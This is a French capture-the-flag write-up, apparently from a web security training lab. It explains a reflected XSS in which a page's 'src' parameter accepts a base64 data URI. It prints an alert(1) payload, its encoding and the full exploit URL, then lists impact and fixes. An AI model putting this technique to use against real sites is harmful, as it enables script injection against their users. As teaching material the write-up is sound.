XSS via Data URI - Page Media
=============================

URL vulnérable :

http://IP_DARKLY/index.php?page=media&src=nsa

Description :

La page Media utilise le paramètre "src" de l'URL pour déterminer la
ressource à charger. Cette valeur est entièrement contrôlée par
l'utilisateur.

L'application accepte une Data URI de type text/html contenant un
document HTML encodé en Base64.

La syntaxe d'une Data URI est :

data:[type MIME][;base64],données

Base64 n'est ni un chiffrement ni une protection. Il s'agit uniquement
d'une autre représentation des mêmes données. Une fois décodé, le
contenu redevient du HTML normal.

Exploitation :

Payload HTML :

<script>alert(1)</script>

Payload encodé en Base64 :

PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

Data URI complète :

data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

URL finale :

http://IP_DARKLY/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

Commande de reproduction :

./Resources/exploit.sh http://IP_DARKLY

Le challenge décode le contenu Base64, reconnaît une balise <script> et
la fonction alert, puis révèle le flag.

Cette faille est pilotée par l'URL : le payload n'est pas enregistré dans
la base de données. Elle est donc différente de la XSS stockée du
formulaire Feedback.

Impact :

- Exécution potentielle de JavaScript dans le navigateur d'une victime ;
- modification du contenu de la page ;
- phishing depuis un domaine considéré comme légitime ;
- exécution d'actions dans le contexte de la victime selon la situation.

Correction :

- Utiliser une whitelist stricte des ressources autorisées ;
- traduire un identifiant fixe, par exemple "nsa", vers un fichier connu ;
- refuser les schémas data: et javascript: ;
- ne jamais injecter directement une entrée utilisateur dans la source
  d'un élément object, iframe ou embed ;
- encoder les sorties selon leur contexte ;
- utiliser une Content Security Policy restrictive.

OWASP :

Cross-Site Scripting / Injection de contenu actif

À retenir :

Le paramètre "src" permettait de fournir une ressource HTML active sous
la forme d'une Data URI entièrement contrôlée par l'utilisateur.
